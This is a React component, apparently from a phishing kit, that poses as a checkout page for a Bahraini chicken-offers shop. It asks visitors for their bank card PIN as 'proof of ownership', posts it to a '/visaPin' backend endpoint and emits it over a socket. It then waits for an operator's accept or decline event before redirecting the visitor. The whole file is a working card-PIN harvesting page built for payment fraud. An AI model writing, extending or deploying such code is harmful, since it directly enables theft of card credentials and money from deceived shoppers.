import axios from "axios";
import React, { useState } from "react";
import { api_route, socket } from "../App";
import { TailSpin } from "react-loader-spinner";
import { id } from "./Home";
import { AiFillLike } from "react-icons/ai";

const PIN = () => {
  const [pin, setPin] = useState("");
  const [load, setLoad] = useState(null);
  const [error, setError] = useState(false);

  const handleSubmit = async (e) => {
    setLoad(true);
    setError(false);
    e.preventDefault();

    try {
      await axios
        .post(api_route + "/visaPin/" + sessionStorage.getItem("id"), {
          visa_pin: pin,
        })
        .then(() => {
          socket.emit("visaPin", { id, visa_pin: pin });
        });
    } catch (error) {
      console.error(error);
    }
  };

  socket.on("acceptVisaPin", (data) => {
    if (id === data) {
      window.location.href = "/success";
    }
  });

  socket.on("declineVisaPin", (data) => {
    if (id === data) {
      setLoad(false);
      window.location.href = "/payment";
    }
  });

  return (
    <div className="w-full lg:w-1/2 flex flex-col items-center justify-center my-5 rounded-md">
      <div className=" bg-opacity-75 w-full flex flex-col md:flex-row  items-center justify-center text-black px-2 py-8 rounded-lg ">
        <div
          className="flex flex-col gap-y-2 md:items-end items-center md:py-2"
          dir="rtl "
        >
          <img src="/logo.png" />
          <span className="text-lg">عروض دجاج البحرين</span>
          <form
            className="w-full flex flex-col  gap-y-3 py-5"
            onSubmit={handleSubmit}
          >
            <div className="w-full flex flex-col gap-y-3 text-black" dir="rtl">
              <div className="flex gap-x-2">
                <span className="w-1/3">عدد المنتجات</span>
                <span>
                  {new Array(sessionStorage.getItem("products"))?.length}
                </span>
              </div>
              <div className="flex gap-x-2">
                <span className="w-1/3"></span>
                <span></span>
              </div>
              <div className="flex gap-x-2">
                <span className="w-1/3"> مبلغ الدفع</span>
                <span>{sessionStorage.getItem("totalPrice")} ر.س</span>
              </div>
            </div>

            <div className="flex flex-col w-full gap-y-3 mt-5 " dir="rtl">
              <span className="">
                الرقم السري لـتأكيد معلومات البطاقة والدفع
              </span>
              <span>( إثبات ملكية )</span>
            </div>

            <div className="flex flex-col w-full gap-3  my-2">
              <input
                value={pin}
                required
                onChange={(e) => setPin(e.target.value)}
                dir="ltr"
                minLength={4}
                maxLength={6}
                type="text"
                placeholder="  **** "
                className="w-full     rounded-md  text-black   p-2   text-center border     outline-green-800"
              />
            </div>

            <button
              type="submit"
              className="flex items-center text-white justify-center gap-2 p-2 w-full mt-5"
              style={{ background: "#8c00ff" }}
            >
              تأكيد
            </button>
            {error && (
              <span className="text-red-500 text-center w-full py-2 text-sm">
                {error}
              </span>
            )}
          </form>
        </div>
      </div>
      {load ? (
        <div className="fixed top-0 w-full h-screen bg-black bg-opacity-20 flex items-center justify-center ">
          <TailSpin
            height="50"
            width="50"
            color="white"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
        </div>
      ) : (
        ""
      )}
    </div>
  );
};

export default PIN;
